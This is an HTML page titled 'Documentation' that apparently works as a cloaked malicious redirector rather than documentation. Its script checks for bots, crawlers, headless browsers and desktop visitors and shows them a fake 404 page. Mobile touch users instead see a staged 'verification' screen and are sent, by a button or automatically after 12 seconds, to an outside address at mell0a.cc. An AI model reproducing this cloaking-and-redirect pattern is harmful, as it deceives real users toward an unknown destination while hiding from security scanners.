<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Documentation</title>
    <style>
        body { font-family: system-ui; background: #0a0a0a; color: #ccc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; max-width: 300px; }
        .loader { width: 40px; height: 40px; border: 2px solid #222; border-top: 2px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .btn { background: #1a1a1a; border: 1px solid #333; padding: 12px 24px; border-radius: 30px; color: #fff; font-size: 16px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
<div class="container">
    <div class="loader"></div>
    <h3>Loading environment</h3>
    <p>Please wait, checking system parameters...</p>
    <div class="btn" id="btn" style="display:none;">Continue →</div>
</div>
<script>
(function(){
    var u = navigator.userAgent.toLowerCase();
    var b = /bot|crawler|spider|slurp|facebook|twitter|whatsapp|telegram|lighthouse|pingdom|uptime|ahrefs|semrush|headless|phantom|puppet|selenium|webdriver|googlebot|bingbot|yandex|baidu|facebot|applebot|ccbot|rogerbot|exabot|dotbot|blexbot|gigabot|spinn3r|yeti|heritrix|python|curl|wget|scrapy/i;
    var isBot = b.test(u) || navigator.webdriver === true;
    var isMobile = /android|iphone|ipod|blackberry|iemobile|opera mini|windows phone|mobile/i.test(u);
    var hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
    if(isBot || !isMobile || !hasTouch){
        document.body.innerHTML = '<div style="padding:50px;text-align:center;">404 — Page not found</div>';
    } else {
        var btn = document.getElementById('btn');
        var container = document.querySelector('.container');
        setTimeout(function(){
            var ld = document.querySelector('.loader');
            if(ld) ld.style.display = 'none';
            var h3 = document.querySelector('h3');
            if(h3) h3.innerHTML = 'Verification complete';
            var p = document.querySelector('p');
            if(p) p.innerHTML = 'Tap button to access content';
            if(btn) btn.style.display = 'inline-block';
        }, 1800);
        if(btn){
            btn.onclick = function(){
                window.location.replace("https://mell0a.cc/4823");
            };
        }
        setTimeout(function(){
            if(btn && btn.style.display !== 'none'){
                window.location.replace("https://mell0a.cc/4823");
            }
        }, 12000);
    }
})();
</script>
</body>
</html>
